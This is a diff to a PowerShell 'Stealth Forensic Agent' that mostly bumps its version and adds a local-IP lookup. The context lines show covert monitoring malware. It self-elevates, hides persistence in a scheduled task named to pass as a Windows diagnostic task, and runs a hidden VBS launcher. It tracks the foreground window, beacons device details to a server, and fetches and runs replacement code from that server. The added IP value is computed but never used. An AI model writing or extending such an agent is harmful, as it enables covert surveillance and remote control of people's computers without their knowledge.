@@ -3,7 +3,7 @@ param(
     [switch]$Install
 )
 
-# Version: 2.0.1
+# Version: 2.0.2
 # Description: Stealth Forensic Agent (Pierogi-Style)
 
 # 0. SELF-ELEVATION (Needed for Security Logs)
@@ -69,7 +69,7 @@ try {
 # 3. ROBUST INSTALLATION LOGIC
 function Install-StealthAgent {
     try {
-        Log-Message "Initiating Stealth Persistent Install v2.0.1..."
+        Log-Message "Initiating Stealth Persistent Install v2.0.2..."
         $TaskName = "Microsoft-Windows-Diagnostic-Cleanup"
         Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
@@ -85,7 +85,7 @@ function Install-StealthAgent {
 
         Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
         
-        $Config = @{ ServerUrl = $ServerUrl; Version = "2.0.1" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "2.0.2" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -138,7 +138,13 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Forensic Agent v2.0.1 Active. ID: $AgentId"
+    Log-Message "Forensic Agent v2.0.2 Active. ID: $AgentId"
+    function Get-LocalIp {
+        try {
+            $IPs = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' -and $_.IPv4Address -notmatch '^169\.254\.' }).IPv4Address
+            if ($IPs) { return $IPs[0] } else { return "127.0.0.1" }
+        } catch { return "127.0.0.1" }
+    }
     
     # Define Win32 API for foreground window
     $Win32Code = @'
@@ -239,8 +245,9 @@ try {
                 $LastIpCheck = $Now
             }
             
+            $LocalIp = Get-LocalIp
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "2.0.1"; status = "online"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "2.0.2"; status = "online"
                 deviceName = $env:COMPUTERNAME; os = $OSInfo; publicIp = $CachedPubIp; localIp = $CachedLocIp; isp = "Enterprise"
             }
             $BodyJson = $Payload | ConvertTo-Json
@@ -302,7 +309,7 @@ try {
             Check-BlockedEvents
             # ---------------------
 
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"2.0.1")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"2.0.2")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
